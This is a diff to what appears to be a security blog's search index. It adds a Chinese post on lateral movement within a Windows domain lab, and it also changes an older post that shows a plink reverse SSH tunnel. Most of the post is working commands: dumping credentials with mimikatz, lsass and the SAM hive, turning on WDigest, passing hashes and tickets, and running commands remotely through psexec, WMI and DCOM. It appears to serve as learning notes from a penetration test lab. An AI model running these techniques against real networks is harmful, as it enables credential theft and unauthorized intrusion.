@@ -1639,6 +1639,189 @@
       </tags>
   </entry>
   <entry>
+    <title>内网渗透测试-域内横向移动</title>
+    <url>/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
+    <content><![CDATA[<h2 id="0x01-Windows常用远程连接"><a href="#0x01-Windows常用远程连接" class="headerlink" title="0x01.Windows常用远程连接"></a>0x01.Windows常用远程连接</h2><h3 id="1-IPC"><a href="#1-IPC" class="headerlink" title="1.IPC"></a>1.IPC</h3><blockquote>
+<p>利用条件，开启139、445端口，没有关闭默认共享</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net use \\10.10.10.20\ipc$ &quot;11&quot; /user:administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;net use</span><br><span class="line">会记录新的网络连接。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">状态       本地        远程                      网络</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">OK                     \\10.10.10.20\ipc$        Microsoft Windows Network</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="2-windows自带工具获取信息"><a href="#2-windows自带工具获取信息" class="headerlink" title="2.windows自带工具获取信息"></a>2.windows自带工具获取信息</h3><blockquote>
+<p>前提是建立ipc$连接</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;dir \\10.10.10.20\c$</span><br><span class="line"> 驱动器 \\10.10.10.20\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 AA35-C001</span><br><span class="line"></span><br><span class="line"> \\10.10.10.20\c$ 的目录</span><br><span class="line"></span><br><span class="line">2021/06/22  14:58         1,379,216 accesschk.exe</span><br><span class="line">2021/07/23  13:25            17,368 demo.ps1</span><br><span class="line">2021/07/29  13:29            13,672 Get-GPPPassword.ps1</span><br><span class="line">2021/07/13  17:11            38,616 nc.exe</span><br><span class="line">2021/07/16  19:18           133,120 netview.exe</span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/07/23  12:49            37,667 powercat.ps1</span><br><span class="line">2021/07/28  21:01           600,580 PowerUp.ps1</span><br><span class="line">2021/07/10  14:52    &lt;DIR&gt;          Program Files</span><br><span class="line">2021/07/16  18:04    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2016/06/28  09:49           170,160 PsLoggedon.exe</span><br><span class="line">2021/07/16  17:44            53,248 PVEFindADUser.exe</span><br><span class="line">2021/07/17  15:29           974,235 SharpHound.ps1</span><br><span class="line">2021/07/23  13:06            17,416 shell.ps1</span><br><span class="line">2021/07/27  17:52            16,663 Sherlock.ps1</span><br><span class="line">2021/07/11  11:27    &lt;DIR&gt;          Users</span><br><span class="line">2021/07/17  11:04    &lt;DIR&gt;          Windows</span><br><span class="line">              12 个文件      3,451,961 字节</span><br><span class="line">               5 个目录 51,462,012,928 可用字节</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-计划任务"><a href="#3-计划任务" class="headerlink" title="3.计划任务"></a>3.计划任务</h3><h4 id="01-at命令-server-2008之前"><a href="#01-at命令-server-2008之前" class="headerlink" title="01.at命令(server 2008之前)"></a>01.at命令(server 2008之前)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net time \\10.10.10.20    #查看系统时间</span><br><span class="line">copy calc.bat \\10.10.10.20\c$    #复制文件到目标系统（内容为calc.exe）</span><br><span class="line">at \\10.10.10.20 0:0AM c:\calc.bat    #创建计划任务</span><br><span class="line">at \\10.10.10.20 id /delete    #删除计划任务</span><br><span class="line">at \\10.10.10.20 0:0AM cmd.exe /c &quot;ipconfig &gt; c:/1.txt&quot;  #写入文件</span><br><span class="line">type \\10.10.10.20\c$\1.txt  #查看文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="02-schtasks命令-server-2008之后"><a href="#02-schtasks命令-server-2008之后" class="headerlink" title="02.schtasks命令(server 2008之后)"></a>02.schtasks命令(server 2008之后)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.20 /tn demo /sc onstart /tr c:\calc.bat /ru system /f  #创建一个demo计划任务</span><br><span class="line">schtasks /run /s 10.10.10.20 /i /tn &quot;demo&quot; #运行计划任务</span><br><span class="line">schtasks /delete /s 10.10.10.20 /tn &quot;demo&quot; /f #删除计划任务</span><br><span class="line">net use \\10.10.10.20\ipc$ /del /y  #删除ipc$连接</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-windows系统散列值获取"><a href="#0x02-windows系统散列值获取" class="headerlink" title="0x02.windows系统散列值获取"></a>0x02.windows系统散列值获取</h2><blockquote>
+<p>LM Hash与NTLM Hash</p>
+<p>LM Hash一共14位，server 2003以后使用NTLM Hash</p>
+</blockquote>
+<h3 id="1-Getpassword"><a href="#1-Getpassword" class="headerlink" title="1.Getpassword"></a>1.Getpassword</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Getpassword.exe</span><br><span class="line"></span><br><span class="line">Authentication Id:0;363018</span><br><span class="line">Authentication Package:Kerberos</span><br><span class="line">Primary User:Administrator</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: Administrator</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 11</span><br><span class="line"></span><br><span class="line">Authentication Id:0;997</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:LOCAL SERVICE</span><br><span class="line">Authentication Domain:NT AUTHORITY</span><br><span class="line"></span><br><span class="line">* User: </span><br><span class="line">* Domain: </span><br><span class="line">* Password: </span><br><span class="line"></span><br><span class="line">Authentication Id:0;996</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:WIN7DC1$</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: WIN7DC1$</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 1G-\ K=Ae q-70DKy+%W7O:02&#x27;JrVV7P^w?A&amp;Po\R./j9TSdQp2tc1W);vJN9.Q5Qov9 -l;`H%W4xcb&gt;J.\m!n*x$bM2r4c`=*%)Mu&quot;8TaBkTM]%Q%IpQs8</span><br><span class="line"></span><br><span class="line">Authentication Id:0;47004</span><br><span class="line">Authentication Package:NTLM</span><br><span class="line">Primary User:</span><br><span class="line">Authentication Domain:</span><br><span class="line"> (LUID ERROR) </span><br><span class="line"></span><br><span class="line">Authentication Id:0;999</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:WIN7DC1$</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: WIN7DC1$</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 1G-\ K=Ae q-70DKy+%W7O:02&#x27;JrVV7P^w?A&amp;Po\R./j9TSdQp2tc1W);vJN9.Q5Qov9 -l;`H%W4xcb&gt;J.\m!n*x$bM2r4c`=*%)Mu&quot;8TaBkTM]%Q%IpQs8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-PwDump7"><a href="#2-PwDump7" class="headerlink" title="2.PwDump7"></a>2.PwDump7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PwDump7.exe</span><br><span class="line"></span><br><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">administration:1000:NO PASSWORD*********************:AE0597DC61A5C66B3A0600C60044C448:::</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-QuarksPwDump"><a href="#3-QuarksPwDump" class="headerlink" title="3.QuarksPwDump"></a>3.QuarksPwDump</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">QuarksPwDump.exe -h</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-通过SAM和system文件获取密码"><a href="#4-通过SAM和system文件获取密码" class="headerlink" title="4.通过SAM和system文件获取密码"></a>4.通过SAM和system文件获取密码</h3><p>（1）导出</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>
+
+<p>（2）mimikatz获取hash</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive  #sam.hive与system.hive在mimikatz目录下</span><br></pre></td></tr></table></figure>
+
+<p>（3）mimikatz直接获取本地SAM</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">privilege::debugtoken::elevate  #提权至systemlsadump::sam  #获取本地SAMsekurlsa::logonpasswords  #获取明文密码NTLM Hash</span><br></pre></td></tr></table></figure>
+
+<p>（4）minikatz在线读取SAM文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-mimikatz离线读取lsass-dmp"><a href="#5-mimikatz离线读取lsass-dmp" class="headerlink" title="5.mimikatz离线读取lsass.dmp"></a>5.mimikatz离线读取lsass.dmp</h3><blockquote>
+<p>lsass.exe进程里面含有明文密码与散列值</p>
+<p>找到lsass.exe进程，右键创建储存文件即可导出</p>
+</blockquote>
+<p><strong>导出文件位置：C:\Users\administrator\AppData\Local\Temp\lsass.exe</strong></p>
+<blockquote>
+<p>也可以使用procdump.exe导出lsass.dmp文件，prodump为微软官方工具不会被查杀</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><code>mimikatz获取lsass.dmp中的散列值</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp  #导入sekurlsa::logonpasswords full  #获取</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-powershell对散列值进行dump"><a href="#6-powershell对散列值进行dump" class="headerlink" title="6.powershell对散列值进行dump"></a>6.powershell对散列值进行dump</h3><p><code>nishang脚本</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Get-PassHashes.ps1PS C:\&gt; Get-PassHashesAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::administration:1000:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-powershell远程加载mimikatz获取密码与散列值"><a href="#7-powershell远程加载mimikatz获取密码与散列值" class="headerlink" title="7.powershell远程加载mimikatz获取密码与散列值"></a>7.powershell远程加载mimikatz获取密码与散列值</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-单机密码抓取"><a href="#8-单机密码抓取" class="headerlink" title="8.单机密码抓取"></a>8.单机密码抓取</h3><blockquote>
+<p>server 2012以上默认关闭Wdigest功能，server 2012以下版本如果安装了KB2871997也无法获取</p>
+<p>开启Wdigest的两种方法</p>
+</blockquote>
+<p>（1）使用reg add命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f  #开启reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f  #关闭</span><br></pre></td></tr></table></figure>
+
+<p>（2）powershell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-哈希传递"><a href="#0x03-哈希传递" class="headerlink" title="0x03.哈希传递"></a>0x03.哈希传递</h2><h3 id="1-使用NTLM-Hash进行哈希传递"><a href="#1-使用NTLM-Hash进行哈希传递" class="headerlink" title="1.使用NTLM Hash进行哈希传递"></a>1.使用NTLM Hash进行哈希传递</h3><blockquote>
+<p>环境</p>
+<p>域名：jiye.net</p>
+<p>IP：10.10.10.10</p>
+<p>用户名：administrator</p>
+<p>NTLM Hash：ae0597dc61a5c66b3a0600c60044c448</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:jiye.net /ntlm:ae0597dc61a5c66b3a0600c60044c448&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>在弹出的system cmd输入</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dir \\DC\C$  #列出域控目标文件夹</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用AES-256密钥进行哈希传递"><a href="#2-使用AES-256密钥进行哈希传递" class="headerlink" title="2.使用AES-256密钥进行哈希传递"></a>2.使用AES-256密钥进行哈希传递</h3><blockquote>
+<p>目标系统安装KB2871997</p>
+</blockquote>
+<h2 id="0x04-票据传递"><a href="#0x04-票据传递" class="headerlink" title="0x04.票据传递"></a>0x04.票据传递</h2><h3 id="1-mimikatz进行票据传递"><a href="#1-mimikatz进行票据传递" class="headerlink" title="1.mimikatz进行票据传递"></a>1.mimikatz进行票据传递</h3><p>（1）导出内存中的票据</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>
+
+<p>（2）清除内存中票据</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p>（3）将高权限票据注入内存</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kerberos::ptt c:\mimikatz\tickets\[0;24329]-2-0-40e10000-Administrator@krbtgt-JIYE.NET.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>（4）列出目标文件夹</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dir \\DC\C$</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-kekeo进行票据传递"><a href="#2-kekeo进行票据传递" class="headerlink" title="2.kekeo进行票据传递"></a>2.kekeo进行票据传递</h3><blockquote>
+<p>环境</p>
+<p>域名：jiye.net</p>
+<p>IP：10.10.10.10</p>
+<p>用户名：administrator</p>
+<p>NTLM Hash：ae0597dc61a5c66b3a0600c60044c448</p>
+</blockquote>
+<p>（1）生成票据</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:administrator /domain:jiye.net /ntlm:ae0597dc61a5c66b3a0600c60044c448&quot;</span><br></pre></td></tr></table></figure>
+
+<p>（2）清除内存中票据</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">kekeo#</span><span class="bash"> kerberos::purgeklist purge  <span class="comment">#window自带</span></span></span><br></pre></td></tr></table></figure>
+
+<p>（3）导入票据</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kerberos::ptt C:\TGT_administrator@JIYE.NET_krbtgt~jiye.net@JIYE.NET.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>（4）列出目标文件夹</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dir \\DC\C$</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-psexec的使用"><a href="#0x05-psexec的使用" class="headerlink" title="0x05.psexec的使用"></a>0x05.psexec的使用</h2><h3 id="1-PsTools工具包中的psexec"><a href="#1-PsTools工具包中的psexec" class="headerlink" title="1.PsTools工具包中的psexec"></a>1.PsTools工具包中的psexec</h3><p>（1）获取system shell（需要建立ipc$连接）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -s cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>（2）获取administrator shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>（3）没有建立ipc$连接的使用方法</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -u administrator -p 11 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>（4）命令回显</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -s cmd.exe /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-msf-中的psexec"><a href="#2-msf-中的psexec" class="headerlink" title="2.msf 中的psexec"></a>2.msf 中的psexec</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/psexecmsf6 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.10rhosts =&gt; 10.10.10.10msf6 exploit(windows/smb/psexec) &gt; set smbdomain jiye.netsmbdomain =&gt; jiye.netmsf6 exploit(windows/smb/psexec) &gt; set smbuser administratorsmbuser =&gt; administratormsf6 exploit(windows/smb/psexec) &gt; set smbpass 11smbpass =&gt; 11msf6 exploit(windows/smb/psexec) &gt; set lhost 10.10.10.130lhost =&gt; 10.10.10.130msf6 exploit(windows/smb/psexec) &gt;run</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-WMIC的使用"><a href="#0x08-WMIC的使用" class="headerlink" title="0x08.WMIC的使用"></a>0x08.WMIC的使用</h2><h3 id="1-Windows系统自带"><a href="#1-Windows系统自带" class="headerlink" title="1.Windows系统自带"></a>1.Windows系统自带</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.10 /user:administrator /password:11 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;type \\10.10.10.10\c$\ip.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-impacket工具包"><a href="#2-impacket工具包" class="headerlink" title="2.impacket工具包"></a>2.impacket工具包</h3><p><code>主要用于Linux向window移动</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmiexec.py administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-wmiexec-vbs调用wmi"><a href="#3-wmiexec-vbs调用wmi" class="headerlink" title="3.wmiexec.vbs调用wmi"></a>3.wmiexec.vbs调用wmi</h3><p>（1）获取system shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.10 administrator 11</span><br></pre></td></tr></table></figure>
+
+<p>（2）命令回显</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd 10.10.10.10 administrator 11 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Invoke-WmiCommand-ps1"><a href="#4-Invoke-WmiCommand-ps1" class="headerlink" title="4.Invoke-WmiCommand.ps1"></a>4.Invoke-WmiCommand.ps1</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">User=<span class="string">&quot;jiye\administrator&quot;</span>  <span class="comment">#目标系统用户名$Password=ConvertTo-SecureString -String &quot;11&quot; -AsPlainText -Force  #目标系统密码$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #整合$Remote=Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 10.10.10.10  #执行$Remote.PaylaodOutput  #输出</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-Invoke-WMIMethod"><a href="#5-Invoke-WMIMethod" class="headerlink" title="5.Invoke-WMIMethod"></a>5.Invoke-WMIMethod</h3><p><code>Powershell自带</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">User=<span class="string">&quot;jiye\administrator&quot;</span>  <span class="comment">#目标系统用户名$Password=ConvertTo-SecureString -String &quot;11&quot; -AsPlainText -Force  #目标系统密码$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #整合Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;10.10.10.10&quot;  -Credential $Cred  #运行calc</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-smbexec"><a href="#0x09-smbexec" class="headerlink" title="0x09.smbexec"></a>0x09.smbexec</h2><h3 id="1-C-版"><a href="#1-C-版" class="headerlink" title="1.C++版"></a>1.C++版</h3><h3 id="2-impacket版"><a href="#2-impacket版" class="headerlink" title="2.impacket版"></a>2.impacket版</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbexec_impacket.exe jiye/administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-linux安装版"><a href="#3-linux安装版" class="headerlink" title="3.linux安装版"></a>3.linux安装版</h3><h2 id="0x10-DCOM的使用"><a href="#0x10-DCOM的使用" class="headerlink" title="0x10.DCOM的使用"></a>0x10.DCOM的使用</h2><h3 id="1-powershell获取DCOM程序列表"><a href="#1-powershell获取DCOM程序列表" class="headerlink" title="1.powershell获取DCOM程序列表"></a>1.powershell获取DCOM程序列表</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication  #server 2012版本以上Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication #win 7、server 2008等</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-DCOM执行系统命令"><a href="#2-DCOM执行系统命令" class="headerlink" title="2.DCOM执行系统命令"></a>2.DCOM执行系统命令</h3><blockquote>
+<p>运行calc.exe，同理将calc.exe换成恶意程序即可</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>))<span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-DCOM在远程主机上执行命令"><a href="#3-DCOM在远程主机上执行命令" class="headerlink" title="3.DCOM在远程主机上执行命令"></a>3.DCOM在远程主机上执行命令</h3><blockquote>
+<p>环境</p>
+<p>域控：DC（jiye.net）</p>
+<p>IP：10.10.10.10</p>
+<p>user：administrator</p>
+<p>pass：11</p>
+<p>成员服务器：WIN7</p>
+<p>IP：10.10.10.20</p>
+<p>user：DC1</p>
+<p>pass：11</p>
+</blockquote>
+<p>（1）首先建立ipc$连接</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net use \\10.10.10.10 &quot;11&quot; /user:jiye\administrator</span><br></pre></td></tr></table></figure>
+
+<p>（2）调用MMC20.Application执行远程命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;10.10.10.20&quot;</span>))<span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>（3）调用{9BA05972-F6A8-11CF-A442-00A0C90A8F39} </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[<span class="built_in">type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;10.10.10.20&quot;</span>)<span class="variable">$obj</span>=[System.Activator]::CreateInstance(<span class="variable">$com</span>)<span class="variable">$item</span>=<span class="variable">$obj</span>.item()<span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>内网渗透测试</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+        <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC-2</title>
     <url>/2020/08/21/DC-2/</url>
     <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
@@ -2483,7 +2666,7 @@
 <blockquote>
 <p>报错为：无法同意密钥交换算法</p>
 <p>Google一下发现需要更新putty，但是更新后还是不好使。。。菜狗一脸茫然！</p>
-<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjMTExOyYjMTExOyYjMTE2OyYjNjQ7JiN4MzE7JiM0ODsmI3gyZTsmIzQ5OyYjNDg7JiM0NjsmIzQ5OyYjNTU7JiN4MmU7JiM1MDsmIzQ5OyYjeDM2Ow==">&#x72;&#111;&#111;&#116;&#64;&#x31;&#48;&#x2e;&#49;&#48;&#46;&#49;&#55;&#x2e;&#50;&#49;&#x36;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjeDZmOyYjMTExOyYjMTE2OyYjeDQwOyYjNDk7JiM0ODsmI3gyZTsmI3gzMTsmIzQ4OyYjNDY7JiM0OTsmIzU1OyYjNDY7JiN4MzI7JiN4MzE7JiN4MzY7">&#114;&#x6f;&#111;&#116;&#x40;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#49;&#55;&#46;&#x32;&#x31;&#x36;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiN4NzI7JiN4NzY7JiN4NjU7JiM1MDsmIzUzOyYjeDM1OyYjNDk7JiN4Mzk7JiM0NTsmI3g3MzsmIzEwNDsmIzk3OyYjeDMyOyYjeDM1OyYjNTQ7JiM2NDsmI3g2YzsmI3g2OTsmI3g2MjsmIzExNTsmIzExNTsmI3g2ODsmIzQ2OyYjMTExOyYjeDcyOyYjeDY3Ow==">&#99;&#x75;&#x72;&#x76;&#x65;&#50;&#53;&#x35;&#49;&#x39;&#45;&#x73;&#104;&#97;&#x32;&#x35;&#54;&#64;&#x6c;&#x69;&#x62;&#115;&#115;&#x68;&#46;&#111;&#x72;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTE3OyYjeDcyOyYjeDc2OyYjeDY1OyYjeDMyOyYjNTM7JiM1MzsmIzQ5OyYjNTc7JiN4MmQ7JiN4NzM7JiMxMDQ7JiN4NjE7JiN4MzI7JiM1MzsmIzU0OyYjeDQwOyYjeDZjOyYjeDY5OyYjOTg7JiN4NzM7JiMxMTU7JiMxMDQ7JiN4MmU7JiMxMTE7JiN4NzI7JiN4Njc7">&#x63;&#117;&#x72;&#x76;&#x65;&#x32;&#53;&#53;&#49;&#57;&#x2d;&#x73;&#104;&#x61;&#x32;&#53;&#54;&#x40;&#x6c;&#x69;&#98;&#x73;&#115;&#104;&#x2e;&#111;&#x72;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
